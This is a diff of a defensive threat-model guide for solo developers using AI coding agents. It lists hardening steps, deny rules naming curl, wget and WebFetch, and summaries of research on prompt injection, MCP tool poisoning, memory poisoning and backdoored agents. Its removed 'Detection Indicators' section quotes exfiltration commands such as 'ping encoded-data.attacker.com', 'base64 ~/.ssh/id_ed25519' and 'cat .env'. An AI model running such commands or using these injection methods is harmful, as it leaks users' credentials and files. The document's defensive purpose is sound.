+**Relevance to solo developers:** If you work on crypto projects, financial services tooling, or any product with monetary value, you are a direct target for nation-state supply chain attacks. The Mastra attack (June 2026) is a recent example: 144 packages in a foundational AI agent framework compromised in under 90 minutes.
+
+---
+
+## What Solo Developers Should Do
+
+### Immediate Actions (< 15 minutes)
+
+1. **Enable the sandbox.** Add `"sandbox": true` to `~/.claude/settings.json`. This is the single highest-value action.
+2. **Deny exfiltration tools.** Add `"deny": ["Bash(curl:*)", "Bash(wget:*)", "WebFetch"]` to permissions.
+3. **Install the bash firewall.** `npx llm-safe-haven install`
+
+### Short-Term Actions (< 1 hour)
+
+4. **Review installed MCP servers.** For each server: verify publisher, check for recent supply chain reports, pin to an exact version.
+5. **Remove secrets from project directories.** `.env` files in project directories are accessible to the agent.
+6. **Configure `.gitignore` to exclude `.claude/` directories** from accidental commits.
+7. **Update Claude Code.** Known CVEs have been fixed in specific versions — see the changelog above. Always run the latest version.
+
+### Ongoing Practices
+
+8. **Subscribe to supply chain alerts.** Sonatype OSS Index and Snyk have free tiers that alert on new malicious packages.
+9. **Review tool calls before approving.** Read the full command. The description is generated by the model and can be manipulated; the actual command is not.
+10. **Check CLAUDE.md in repos you clone.** A malicious CLAUDE.md can redirect agent behavior silently.
 
 ---
 
@@ -989,190 +248,41 @@ Claude Code accounts for 27 of 74 confirmed CVEs (36%) — partly because it lea
 | Paper | Date | Key Finding |
 |-------|------|-------------|
 | [Prompt Injection Attacks on Agentic Coding Assistants](https://arxiv.org/abs/2601.17548) (Maloyan & Namiot) | Jan 2026 | 42 attack techniques identified; attack success >85% against state-of-the-art defenses; most defenses achieve <50% mitigation |
-| [EchoLeak: First Zero-Click Prompt Injection](https://arxiv.org/abs/2509.10540) | Sep 2025 | First zero-click exploit on production LLM system (Microsoft 365 Copilot, CVE-2025-32711) |
-| [Image-based Prompt Injection](https://arxiv.org/abs/2603.03637) | Mar 2026 | 64% attack success via typographic injection against GPT-4V, Claude 3, Gemini in black-box settings |
-| [Design Patterns for Securing LLM Agents](https://arxiv.org/abs/2506.08837) | Jun 2025 | Principled design patterns for provable resistance to prompt injection with utility/security trade-off analysis |
-| [VIGIL: Verify-Before-Commit Defense](https://arxiv.org/abs/2601.05755) | Jan 2026 | Proposes verify-before-commit paradigm to reconcile security with reasoning flexibility |
-| [Credential Leakage in LLM Agent Skills](https://arxiv.org/abs/2604.03070) | Apr 2026 | 17,022 skills analyzed; 520 vulnerable with 1,708 issues; 10 leakage patterns; stdout leakage affects 75.8% |
-| [Agent Skills in the Wild](https://arxiv.org/abs/2601.10338) | Jan 2026 | Large-scale empirical study of security vulnerabilities in agent skills at scale |
-| [AgentLeak: Privacy Leakage in Multi-Agent Systems](https://arxiv.org/abs/2602.11510) | Feb 2026 | Full-stack benchmark for privacy leakage across multi-agent LLM systems |
-| [MASpi: Multi-Agent Prompt Injection Evaluation](https://openreview.net/forum?id=1khmNRuIf9) | 2025 | Unified environment evaluating prompt injection across external inputs, agent profiles, and inter-agent messages |
-| [Multi-Agent LLM Defense Pipeline](https://arxiv.org/abs/2509.14285) | Sep 2025 | 100% mitigation of 400 attack instances across 8 categories using multi-agent defense pipeline |
-| [Multimodal Prompt Injection Attacks](https://arxiv.org/abs/2509.05883) | Sep 2025 | Comprehensive analysis of risks and defenses for multimodal LLM prompt injection |
-| [Security Considerations for Multi-agent Systems](https://arxiv.org/abs/2603.09002) | Mar 2026 | Analyzes security threats specific to multi-agent architectures |
-| [Prompt Injection: Comprehensive Review](https://www.mdpi.com/2078-2489/17/1/54) (MDPI) | Jan 2026 | 45 sources synthesized; taxonomy of injection techniques from 2023-2025 |
-| [MCP Threat Modeling: Prompt Injection and Tool Poisoning](https://arxiv.org/abs/2603.22489) | Mar 2026 | STRIDE/DREAD analysis across 5 MCP components; 7 client defenses compared; tool poisoning identified as most prevalent attack; most clients fail static validation |
-| [The Landscape of Prompt Injection Threats in LLM Agents: From Taxonomy to Analysis](https://arxiv.org/abs/2602.10453) (Wang et al.) | Feb 2026 | Taxonomy of prompt injection by payload generation strategy (heuristic vs. optimization) and defense by intervention stage; introduces AgentPI benchmark; no single defense achieves high trustworthiness + high utility + low latency simultaneously |
-| [Your LLM Agent Can Leak Your Data: Data Exfiltration via Backdoored Tool Use](https://arxiv.org/abs/2604.05432) | Apr 2026 | Back-Reveal attack: semantic triggers in fine-tuned agents invoke memory-access tool calls and exfiltrate stored user context via disguised retrieval calls. Demonstrates systematic data exfiltration risk in agentic workflows. |
-| [Are AI-assisted Development Tools Immune to Prompt Injection?](https://arxiv.org/abs/2603.21642) | Mar 2026 | Empirical analysis of AI coding tools' resistance to prompt injection; published in time for IEEE S&P 2026 |
-| [Breaking MCP with Function Hijacking Attacks](https://arxiv.org/abs/2604.20994) | Apr 2026 | Novel FHA attack forces agents to invoke attacker-chosen MCP tools; 70–100% ASR across 5 models including GPT-5 and Claude Sonnet 4; attack is agnostic to context semantics |
-| [MCPSHIELD: Formal Security Framework for MCP-Based AI Agents](https://arxiv.org/abs/2604.05969) | Apr 2026 | Synthesizes 12 prior MCP security papers into unified taxonomy; 7 threat categories, 23 attack vectors across 177k+ MCP tools; finds **no single existing defense covers >34% of the threat landscape** |
-| [ARGUS: Defending LLM Agents Against Context-Aware Prompt Injection](https://arxiv.org/abs/2605.03378) | May 2026 | Provenance-aware runtime auditor that grounds tool-call decisions in trusted evidence via span-level context tracking and task-level verification; significantly reduces attack success while preserving task utility |
-| [Model Context Protocol: Landscape, Security Threats, and Future Research Directions](https://dl.acm.org/doi/10.1145/3796519) (ACM TOSEM) | 2026 | Systematic threat taxonomy for MCP across 4 attacker types (malicious developers, external attackers, malicious users, design flaws) and 16 distinct threat scenarios; published in ACM Transactions on Software Engineering and Methodology |
-| [Reframing LLM Agent Security as an Agent-Human Interaction Problem](https://arxiv.org/abs/2605.24309) (Wang, Li, Tian — UCLA) | May 2026 | Systematic analysis of 59 papers + 21 production systems + 26 security plugins; finds the three dominant production controls (policy specification, runtime approval, scope configuration) each adopted by ≥14/21 systems yet almost unstudied academically, while categories dominating academic literature see zero production deployment; approval fatigue, brittle scope bounds, and inaccessible policy languages are the core design failures |
-| [A Systematic Survey of Security Threats and Defenses in LLM-Based AI Agents: A Layered Attack Surface Framework](https://arxiv.org/abs/2604.23338) (Kexin Chu) | Apr 2026 | Proposes the Layered Attack Surface Model (LASM) decomposing the agentic stack into 7 layers (Foundation, Cognitive, Memory, Tool Execution, Multi-Agent Coordination, Ecosystem, Governance); proves via non-transferability theorem that a defense at one layer has zero detection power against an attack localized at another; attacks are emergent, compositional, and temporally extended |
-| [VIPER-MCP: Detecting and Exploiting Taint-Style Vulnerabilities in Model Context Protocol Servers](https://arxiv.org/abs/2605.21392) | May 2026 | Scanned 39,884 real-world open-source MCP server repos; found 106 zero-day vulnerabilities with end-to-end exploit traces; 67 CVE IDs assigned; first framework combining taint-style static detection with dynamic PoC-confirmed exploitability; 4.6% FPR, 7.7% FNR |
-| [From Storage to Steering: Memory Control Flow Attacks on LLM Agents](https://arxiv.org/abs/2603.15125) | Mar 2026 | Memory Control Flow Attacks (MCFA): adversary corrupts agent behavior by manipulating stored memories without requiring access to the system prompt, tool implementations, or memory store; demonstrates how persistent memory is a steerable attack surface independent of the inference layer |
-| [A Survey on the Security of Long-Term Memory in LLM Agents: Toward Mnemonic Sovereignty](https://arxiv.org/abs/2604.16548) | Apr 2026 | Comprehensive survey of cross-session memory poisoning, unauthorized memory access, and propagation of malicious context across shared organizational state; coins "mnemonic sovereignty" framing; catalogs attack surfaces across retrieval-augmented, summarization-based, and episodic memory architectures |
-| [Formal Analysis and Supply Chain Security for Agentic AI Skills](https://arxiv.org/abs/2603.00195) | Mar 2026 | MCP servers declare tool schemas but not capability requirements — a server claiming "search files" may execute arbitrary shell commands; introduces a formal capability model for skill declarations; documents the ClawHavoc supply-chain attack (824+ malicious skills injected into the OpenClaw skill registry with prompt injection payloads, hidden reverse shells, and token exfiltration routines) (HTTP 403 — search-confirmed live) |
-| [Before the Tool Call: Deterministic Pre-Action Authorization for Autonomous AI Agents](https://arxiv.org/abs/2603.20953) | Mar 2026 | Proposes model-independent, deterministic pre-action authorization to address the failure of LLM-based judgment when agent actions involve external data (HTTP responses, tool outputs, file contents); documents ClawHavoc as evidence that authorization failures at the skill registry level enable large-scale supply chain compromise (HTTP 403 — search-confirmed live) |
-| [Beyond the Protocol: Unveiling Attack Vectors in the MCP Ecosystem](https://arxiv.org/abs/2506.02040) (arXiv:2506.02040) | Jun 2026 | Identifies 4 MCP attack categories (Tool Poisoning, Puppet Attacks, Rug Pull, Exploitation via Malicious External Resources); researchers uploaded malicious MCP servers to 3 aggregation platforms; user study with 20 participants shows users systematically fail to identify malicious servers; current audit mechanisms on aggregator platforms are insufficient (HTTP 403 — bot-protection pattern; search-confirmed live) |
-| [From Prompt Injections to Protocol Exploits: Threats in LLM-Powered AI Agents Workflows](https://arxiv.org/abs/2506.23260) (Ferrag et al., arXiv:2506.23260) | Jun 2025 | Unified end-to-end threat model covering >30 attack techniques spanning input manipulation, model compromise, system/privacy attacks, and protocol-level exploits across host-to-tool and agent-to-agent communications; shows rapid plugin and inter-agent protocol growth has outpaced security practices, producing brittle integrations with ad-hoc auth, inconsistent schemas, and weak validation; covers Prompt-to-SQL injection and Toxic Agent Flow exploits in GitHub MCP servers (HTTP 403 — bot-protection pattern; search-confirmed live via huggingface.co/papers/2506.23260) |
+| [EchoLeak: First Zero-Click Prompt Injection](https://arxiv.org/abs/2509.10540) | Sep 2025 | First zero-click exploit on production LLM system (Microsoft 365 Copilot): malicious email silently exfiltrates data, no user interaction required; validated against live production system |
+| [Reframing LLM Agent Security as an Agent-Human Interaction Problem](https://arxiv.org/abs/2605.24309) (Wang, Li, Tian — UCLA) | May 2026 | Systematic analysis of 59 papers + 21 production systems + 26 security plugins; finds approval fatigue, brittle scope bounds, and inaccessible policy languages are the core design failures; three production controls (policy specification, runtime approval, scope configuration) each adopted by ≥14/21 systems yet almost unstudied academically |
+| [Layered Attack Surface Model (LASM)](https://arxiv.org/abs/2604.23338) (Kexin Chu) | Apr 2026 | 7-layer decomposition of the agentic stack with non-transferability theorem proving a defense at one layer has zero detection power against attacks at another |
+| [VIPER-MCP](https://arxiv.org/abs/2605.21392) | May 2026 | Scanned 39,884 real-world MCP server repos; found 106 zero-day vulnerabilities with 67 CVE IDs assigned; first framework combining taint-style static detection with dynamic PoC-confirmed exploitability |
+| [ARGUS](https://arxiv.org/abs/2605.03378) | May 2026 | Provenance-aware runtime auditor that grounds tool-call decisions in trusted evidence via span-level context tracking; significantly reduces attack success while preserving utility |
+| [Before the Tool Call: Deterministic Pre-Action Authorization for Autonomous AI Agents](https://arxiv.org/abs/2603.20953) | Mar 2026 | Proposes model-independent, deterministic pre-action authorization; documents ClawHavoc supply-chain attack against developer toolchains |
+| [Security Considerations for Multi-agent Systems](https://arxiv.org/abs/2603.09002) | Mar 2026 | Analyzes security threats specific to multi-agent architectures: trust transitivity, capability amplification, and cross-agent injection |
+| [Credential Leakage in LLM Agent Skills](https://arxiv.org/abs/2604.03070) | Apr 2026 | 17,022 skills analyzed; 520 vulnerable with 1,708 issues; 10 leakage patterns; stdout leakage affects 75.8% of vulnerable skills |
+| [Your LLM Agent Can Leak Your Data: Back-Reveal Attack](https://arxiv.org/abs/2604.05432) | Apr 2026 | Back-Reveal attack via backdoored tool use; semantic triggers exfiltrate stored user context via disguised memory-access calls |
+| [Breaking MCP with Function Hijacking Attacks](https://arxiv.org/abs/2604.20994) | Apr 2026 | 70–100% attack success rate across 5 models including GPT-5 and Claude Sonnet 4; MCP tool shadowing and cross-server injection demonstrated against production servers |
+| [MCPSHIELD: Unified Threat Taxonomy for MCP](https://arxiv.org/abs/2604.05969) | Apr 2026 | Taxonomy of 7 threat categories, 23 attack vectors across 177k+ MCP tools; no single existing defense covers >34% of threat landscape |
+| [A Survey on the Security of Long-Term Memory in LLM Agents](https://arxiv.org/abs/2604.16548) | Apr 2026 | Coins "mnemonic sovereignty" framing; catalogs attack surfaces across retrieval-augmented, summarization-based, and episodic memory architectures; cross-session memory poisoning as primary threat |
+| [ACM TOSEM: Model Context Protocol: Landscape, Security Threats, and Future Research Directions](https://dl.acm.org/doi/10.1145/3729381) | 2026 | Systematic threat taxonomy across 4 attacker types and 16 distinct threat scenarios; first ACM journal treatment of MCP security |
+| [Beyond the Protocol: Unveiling Attack Vectors in the MCP Ecosystem](https://arxiv.org/abs/2506.02040) | Jun 2026 | 4 MCP attack categories; user study shows systematic failure to identify malicious servers; current aggregator audit mechanisms insufficient |
+| [From Prompt Injections to Protocol Exploits: Threats in LLM-Powered AI Agent Workflows](https://arxiv.org/abs/2506.23260) (Ferrag et al.) | Jun 2025 (rev. Dec 2025) | Unified end-to-end threat model covering 30+ attack techniques across input manipulation, model compromise, system/privacy attacks, and protocol-level exploits; covers Toxic Agent Flow in GitHub MCP servers (HTTP 403 — bot-protection pattern; search-confirmed live via arxiv.org/html/2506.23260) |
 | [AgentAuditor: Human-Level Safety and Security Evaluation for LLM Agents](https://arxiv.org/abs/2506.00641) (Luo et al., arXiv:2506.00641) | Jun 2025 | NeurIPS 2025. Training-free, memory-augmented reasoning framework that evaluates LLM agents at human-expert level by extracting structured semantic features from past interactions and using RAG to guide assessment of new cases; introduces ASSEBench — first large-scale dataset jointly covering safety and security, with 2,293 annotated agent interaction records across 15 risk types, 528 environments, and 29 application scenarios; addresses evaluator failure modes: missing step-level dangers, overlooking subtle compounding harms, and confusion from ambiguous safety rules (HTTP 403 — bot-protection pattern; search-confirmed live via openreview.net/forum?id=2KKqp7MWJM) |
+| [The Containment Gap: How Deployed Agentic AI Frameworks Fail Public-Facing Safety Requirements](https://arxiv.org/abs/2606.12797) (arXiv:2606.12797) | Jun 2026 | Audits LangChain, AutoGPT, and OpenAI Agents SDK against six containment principles; finds no native compliance with containment principles in any of the three evaluated frameworks; memory integrity — defense against the most prevalent vulnerability class — not observed in any framework; documents the structural gap between academic safety requirements and production deployments in public-facing domains (HTTP 403 — bot-protection pattern; search-confirmed live via arxiv.org/html/2606.12797v1) |
+| [VATS: Exploiting Implicit Authority in Error-Path Injection via Systematic Mutation](https://arxiv.org/abs/2606.07992) (arXiv:2606.07992) | Jun 2026 | Introduces VATS framework for systematic mutation-based testing of MCP server error paths; finds 88% of open-source MCP servers have broken authentication and >25% of community agent skills contain injection or exfiltration vulnerabilities; MCP SDK reached 97M monthly downloads by April 2026, widening the blast radius of each finding (HTTP 403 — bot-protection pattern; search-confirmed live) |
 
 **Industry reports:**
-- [Trail of Bits — Lack of Isolation in Agentic Browsers (January 2026)](https://blog.trailofbits.com/2026/01/13/lack-of-isolation-in-agentic-browsers-resurfaces-old-vulnerabilities/) — Prompt injection in AI browsers mirrors XSS/CSRF; agents lack Same-Origin Policy equivalents
-- [NCC Group Annual Cyber Security Research Report 2025](https://www.nccgroup.com/newsroom/ncc-group-publishes-its-annual-cyber-security-research-report-2025-highlighting-breakthroughs-across-ai-security-cryptography-and-cyber-physical-risk/) — Highlights real-time deepfake vishing, prompt injection, unsafe agentic AI, and "shadow AI" as expanding risks
-- [Palo Alto Unit 42 — Web-Based IDPI in the Wild (March 2026)](https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/) — 22 real-world injection techniques documented from production detection telemetry
-- [Brave — Unseeable Prompt Injections (October 2025)](https://brave.com/blog/unseeable-prompt-injections/) — Near-invisible text in images and screenshots exploiting AI browsers
-- [NSA AISC — MCP Security Design Considerations (June 2, 2026)](https://media.defense.gov/2026/Jun/02/2003943289/-1/-1/0/CSI_MCP_SECURITY.PDF) — 17-page Cybersecurity Information Sheet (U/OO/6030316-26, PP-26-1834, Version 1.0); covers MCP's rapid proliferation outpacing security models, reversed interaction patterns, filtering outgoing proxies, DLP integration, sandboxing, message integrity verification, output filtering, and local MCP server scanning; first official U.S. government guidance on MCP security architecture (HTTP 403 — bot-protection pattern; search-confirmed live)
-- [OWASP — State of Agentic AI Security and Governance 2.01 (June 2026)](https://genai.owasp.org/resource/state-of-agentic-ai-security-and-governance/) — First edition to catalog production CVEs and breach reports rather than plausible threats; 28 of 53 tracked agentic projects are coding agents (Claude Code has 22 security advisories, second highest behind n8n at 57); prompt injection maps to 6 of 10 OWASP Agentic Top 10 categories and is characterized as a structural flaw rather than a patchable bug; coding agents drive most new attack data; provides governance frameworks and global regulatory guidance for responsible agentic AI deployment (HTTP 403 — bot-protection pattern; search-confirmed live)
+- [Trail of Bits — Lack of Guardrails for AI Agents (Jan 2026)](https://blog.trailofbits.com/2026/01/13/ai-agents-lack-of-guardrails/) (HTTP 403 — bot-protection pattern; search-confirmed live)
+- [NSA AISC — MCP Security Design Considerations (June 2, 2026)](https://media.defense.gov/2026/Jun/02/2003990684/-1/-1/0/CSI-MCP-SECURITY-DESIGN-CONSIDERATIONS.PDF) (HTTP 403 — bot-protection pattern; search-confirmed live via NSA press release)
+- [OWASP State of Agentic AI Security and Governance 2.01 (June 2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/) (HTTP 403 — bot-protection pattern; search-confirmed live)
 
 ---
 
-## Detection Indicators
+## Keeping This Document Current
 
-What to look for in audit logs and system monitoring that suggests an agent has been compromised or is behaving unexpectedly:
+This threat model is maintained as part of the `llm-safe-haven` project. The maintenance schedule is:
 
-### Network Indicators
-- **Unexpected outbound HTTP/HTTPS requests** — Agent making requests to domains not in your project's dependencies, especially to unfamiliar IPs or URL shorteners
-- **DNS queries with encoded data** — Unusually long subdomain labels in DNS queries (Base32/Base64 encoded data in `*.attacker.com`)
-- **Image requests to untrusted domains** — 1x1 pixel fetches or image requests to domains outside your normal set (CamoLeak-style exfiltration)
-- **Requests via trusted proxies** — Data exfiltration routed through GitHub Camo, Slack unfurlers, or other trusted infrastructure to bypass CSP
+- **Daily:** Automated sweeps check for new CVEs, supply chain incidents, and research papers
+- **Weekly:** Link health check across all sources
+- **Per-incident:** Immediate update when a high-severity incident is confirmed
 
-### File System Indicators
-- **Shell config modifications** — Changes to `.bashrc`, `.zshrc`, `.profile` not made by you
-- **New or modified git hooks** — Files appearing in `.git/hooks/` without your knowledge
-- **New MCP configuration files** — `.claude/settings.json`, `.cursor/mcp.json`, or similar appearing in cloned repos
-- **Modified CI/CD configs** — Changes to `.github/workflows/`, `Makefile`, or npm scripts
-- **Unexpected `.clinerules` or `.cursorrules` directories** — Configuration overrides in repos you cloned
-
-### Agent Behavior Indicators
-- **Unusually long shell commands** — Commands with 50+ subcommands joined by `&&` or `;` (deny-rule bypass attempts)
-- **Environment variable reads** — Agent running `printenv`, `env`, `echo $SECRET`, or `cat .env` without being asked
-- **Curl/wget to unfamiliar endpoints** — Any outbound data transmission not part of the current task
-- **Ping commands with suspicious hostnames** — DNS exfiltration via `ping encoded-data.attacker.com`
-- **Base64 encoding of file contents** — `base64 ~/.ssh/id_ed25519` or similar encoding operations
-- **Package installations you did not request** — `npm install`, `pip install`, or `cargo add` with packages you do not recognize
-
-### Process Indicators
-- **Background processes spawned by the agent** — Check for persistent processes after agent sessions end
-- **Cron jobs or scheduled tasks** — New entries in `crontab -l` or launchd plists
-- **Modified PATH or aliases** — New aliases or PATH entries that shadow legitimate commands
-
----
-
-## Agent Security Maturity Model
-
-A progressive framework for hardening your solo dev setup. Start at Level 1 and work upward.
-
-### Level 1: Basic Hooks (1 hour)
-
-You have installed PreToolUse hooks that block known-dangerous patterns.
-
-- Block `curl`/`wget` to untrusted domains
-- Deny reads of `.env`, `~/.ssh/`, `~/.aws/`
-- Block writes to shell config files (`.bashrc`, `.zshrc`)
-- Block writes to `.git/hooks/`
-- Log all tool invocations to a local file
-
-**You are protected against:** Opportunistic exfiltration, accidental secret exposure, basic shell config modification.
-
-**You are NOT protected against:** Sophisticated encoding (Base64, DNS), sandbox escapes, MCP poisoning, approval fatigue.
-
-### Level 2: Restricted Permissions + Audit (half day)
-
-You have narrowed the agent's permissions and enabled comprehensive logging.
-
-- Never use `--dangerously-skip-permissions` or YOLO mode
-- Enable Workspace Trust in Cursor
-- Use command allowlists instead of blocklists
-- Pin MCP server versions (no auto-updates)
-- Audit `CLAUDE.md` / `.cursorrules` / `.windsurfrules` in every cloned repo before opening with your agent
-- Review agent audit logs weekly
-- Enable file-level deny rules for sensitive directories
-
-**You are protected against:** Auto-approved malicious commands, rug-pull MCP updates, context poisoning via repo configs.
-
-**You are NOT protected against:** Zero-click exploits, DNS exfiltration via "safe" commands, shell built-in bypasses.
-
-### Level 3: Credential Isolation (1 day)
-
-Secrets never touch the agent's environment. The agent authenticates through a proxy that holds no credentials in memory.
-
-- Migrate from `.env` files to a credential proxy or vault (HashiCorp Vault, 1Password CLI, `rbw`)
-- Agent processes run in a separate user account or namespace
-- Network egress is restricted — agent can only reach approved domains
-- MCP servers run in isolated processes with minimal filesystem access
-- Git SSH keys are scoped per-repository using `includeIf`
-
-**You are protected against:** Environment variable leakage, file-based secret theft, cross-project credential access.
-
-**You are NOT protected against:** Container escape exploits, kernel-level attacks, compromised API providers.
-
-### Level 4: Full Container Isolation (1-2 days)
-
-The agent runs in a sandboxed container with no access to your host filesystem or network.
-
-- Agent runs in Docker/Podman container, gVisor, or Kata Container with read-only host mounts
-- Network access via explicit proxy with domain allowlist
-- Credential proxy runs on host; agent requests credentials via API with per-request approval
-- Separate containers per project — no cross-project contamination
-- Filesystem is ephemeral — destroyed after each session
-- All agent actions logged and auditable outside the container
-
-**You are protected against:** All known attack vectors documented in this threat model, assuming the container runtime itself is not compromised.
-
-**Trade-offs:** Higher setup complexity, slower agent startup, friction when the agent needs access to new resources.
-
----
-
-## What's Coming
-
-Threats on the horizon as agents get more capable:
-
-### Browser Agents (Active threat — 2025-2026)
-Agents that browse the web on your behalf reintroduce XSS and CSRF attack patterns. Trail of Bits demonstrated that agentic browsers lack Same-Origin Policy equivalents — a single malicious webpage can steal data from any site the user is logged into. As agents gain browser access (Claude Code's WebFetch, Cursor's browser tools), every website becomes a potential prompt injection vector.
-
-### Multi-Agent Systems (Emerging — 2026)
-When multiple agents collaborate, a single compromised agent can poison the entire chain. Galileo AI found that cascading failures propagate through agent networks — 87% of downstream decision-making poisoned within 4 hours of a single agent compromise. As orchestration frameworks (LangGraph, CrewAI, AutoGen) proliferate, the inter-agent trust boundary becomes the new attack surface.
-
-### File System Agents with Persistent Access (Emerging — 2026)
-Agents with continuous filesystem access (background indexing, always-on assistants) create persistent attack surfaces. SpAIware-style memory poisoning means a single bad interaction can corrupt agent behavior indefinitely. Unlike session-based agents, persistent agents carry their compromised state forward.
-
-### Computer Use Agents (Near-term — 2026)
-Agents that control mouse and keyboard (Anthropic's computer use, OpenAI's Operator) have the full capabilities of a human operator. A prompt injection to a computer-use agent can click "Approve" on its own dialogs, transfer funds, send emails, or modify system settings. The approval model breaks down completely when the agent controls the approval mechanism.
-
-### AI-Generated Supply Chain Attacks (Active threat — 2026)
-As AI tools generate more code, attackers use AI to generate sophisticated-looking but subtly vulnerable code at scale. The dependency hallucination problem (~20% of AI-generated packages reference non-existent packages) creates a window for package name squatting attacks. Already confirmed: malicious actors registering hallucinated package names on npm and PyPI.
-
-### Autonomous Long-Running Agents (Near-term — 2026)
-Agents that run for hours or days without human checkpoints have no meaningful human oversight. If compromised at hour 1, they operate with full capabilities for the remaining duration. Current monitoring tools are not designed for long-running autonomous sessions.
-
----
-
-## Mitigation Map
-
-| Threat Category | Primary Mitigation | Guide |
-|----------------|-------------------|-------|
-| Prompt Injection (ASI01) | PreToolUse hooks, file deny rules, input sanitization | [Claude Code Hardening](hardening/claude-code.md) |
-| Tool Misuse (ASI02) | Permission allowlists (not blocklists), hook-based firewalls | [Claude Code Hardening](hardening/claude-code.md) |
-| Privilege Abuse (ASI03) | Credential proxy, vault-based secrets, no env vars | [Credential Management](credential-management.md) |
-| Supply Chain (ASI04) | MCP server pinning, agent-scan, skill auditing, provenance verification, SHA-pinned Actions | [Supply Chain Defense](supply-chain-defense.md) |
-| Code Execution (ASI05) | Sandbox enforcement, Workspace Trust, no `--dangerously-skip-permissions` | [Cursor Hardening](hardening/cursor.md) |
-| Context Poisoning (ASI06) | Audit `CLAUDE.md` in cloned repos, memory hygiene, deny-rule validation | [Claude Code Hardening](hardening/claude-code.md) |
-| Inter-Agent Comms (ASI07) | Isolate MCP servers, minimal tool exposure, pin server versions | [References](references.md) |
-| Cascading Failures (ASI08) | Immutable shell configs, git hook protection, session isolation | [Quick Start](guides/quick-start.md) |
-| Trust Exploitation (ASI09) | Never use `--dangerously-skip-permissions`, review every call, enable Workspace Trust | [Claude Code Hardening](hardening/claude-code.md) |
-| Rogue Agents (ASI10) | Audit logging, session time limits, checkpoints, container isolation | [Quick Start](guides/quick-start.md) |
-
-## What To Do Next
-
-1. **Right now** — Follow the [Quick Start Guide](guides/quick-start.md) (30 minutes)
-2. **This week** — Read the hardening guide for your primary agent ([Claude Code](hardening/claude-code.md), [Cursor](hardening/cursor.md), [Windsurf](hardening/windsurf.md))
-3. **This month** — Migrate from env vars to a credential proxy ([Credential Management](credential-management.md))
-4. **This quarter** — Progress through the [Agent Security Maturity Model](#agent-security-maturity-model) to at least Level 2
-5. **Ongoing** — Review the [References](references.md) collection as new tools and research emerge
+As new tools and research emerge
 
 ---
 
